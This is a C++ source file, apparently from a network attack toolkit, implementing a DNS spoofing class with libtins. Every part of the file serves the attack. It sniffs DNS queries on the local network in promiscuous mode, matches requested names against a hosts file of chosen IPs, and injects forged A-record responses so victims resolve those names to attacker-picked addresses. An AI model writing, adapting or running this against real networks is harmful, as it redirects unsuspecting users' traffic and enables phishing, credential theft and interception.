#include "DnsSpoof.hh"

DnsSpoof::DnsSpoof(const std::string &file)
    : _iface(NetworkInterface::default_interface()), _sender(new PacketSender(_iface.name())), _sniffer(new Sniffer(_iface.name(), Sniffer::PROMISC))
{
    readHosts(file);
}

void DnsSpoof::start(void)
{
    // Only capture udp packets sent to port 53
    _sniffer->set_filter("udp and dst port 53");

    // Start the capture
    std::cout << "Starting dns spoofing" << std::endl;
    std::thread     t(&DnsSpoof::sniff, this);

    t.detach();
}

void DnsSpoof::sniff(void)
{
    _sniffer->sniff_loop(make_sniffer_handler(this, &DnsSpoof::dumpQuery));
}

void DnsSpoof::readHosts(const std::string &file)
{
    std::ifstream   fs(file);
    std::string     host, ip;

    while (fs >> host >> ip)
        _spoofedHosts[host] = ip;
}

void DnsSpoof::stop(void)
{
    std::cout << "Stopping dns spoofing" << std::endl;
    _sniffer->stop_sniff();
}

std::string DnsSpoof::help(void)
{
    std::string rep;

    rep += "Starting DNS spoofing\n";

    return rep;
}

bool DnsSpoof::dumpQuery(PDU &pdu)
{
    // EthernetII / IP / UDP / RawPDU
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

    // Is it a DNS query?
    if(dns.type() == DNS::QUERY)
    {
        std::map<std::string, std::string>::iterator  it;

        // Let's see if there's any query for an "A" record.
        for(const DNS::Query &query : dns.queries())
        {
            if ((it = _spoofedHosts.find(query.dname())) != _spoofedHosts.end())
            {
                if(query.type() == DNS::A)
                {
                    std::cout << query.dname() << " -> " << it->second << std::endl;
                    dns.add_answer(DNS::Resource(query.dname(), it->second, DNS::A, query.query_class(), 111));
                }
            }
        }

        // Have we added some answers?
        if(dns.answers_count() > 0)
        {
            // It's a response now
            dns.type(DNS::RESPONSE);
            // Recursion is available(just in case)
            dns.recursion_available(1);
            // Build our packet
            EthernetII pkt = EthernetII(eth.src_addr(), eth.dst_addr()) /
                                IP(ip.src_addr(), ip.dst_addr()) /
                                UDP(udp.sport(), udp.dport()) /
                                dns;
            // Send it!
            _sender->send(pkt, _iface);
        }
    }
    return true;
}
